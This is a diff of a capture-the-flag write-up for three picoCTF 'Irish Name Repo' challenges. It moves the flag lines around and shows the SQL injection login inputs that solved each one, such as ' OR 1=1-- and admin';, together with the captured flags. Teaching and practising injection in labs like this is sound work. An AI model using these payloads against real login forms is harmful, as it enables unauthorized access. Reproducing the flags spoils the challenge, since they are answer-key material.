@@ -7,11 +7,12 @@ This tells us that the site uses a SQL database. So we use basic SQL Injection t
 username: ' OR 1=1--
 password: anything
 ```
-And we successfully login.
-
+And we successfully login.  
+  
+  
+- **Flag:** `picoCTF{s0m3_SQL_c218b685}`
+  
 ---
-
-**Flag:** `picoCTF{s0m3_SQL_c218b685}`
 
 # Irish Name Repo 2
 
@@ -21,11 +22,12 @@ When we use basic SQL injections we see `SQLi detected.` So we try and use `;` t
 username: admin';
 password: anything
 ```
-And we successfully login.
-
+And we successfully login.  
+  
+  
+- **Flag:** `picoCTF{m0R3_SQL_plz_aee925db}`
+  
 ---
-
-**Flag:** `picoCTF{m0R3_SQL_plz_aee925db}`
 
 # Irish Name Repo 3
 
@@ -42,7 +44,6 @@ So now we try entering the word `be` in the input field and observe whether it g
 ```
 password: 'be 1 be'
 ```
-
----
-
-**Flag:** `picoCTF{3v3n_m0r3_SQL_06a9db19}`
+  
+  
+- **Flag:** `picoCTF{3v3n_m0r3_SQL_06a9db19}`
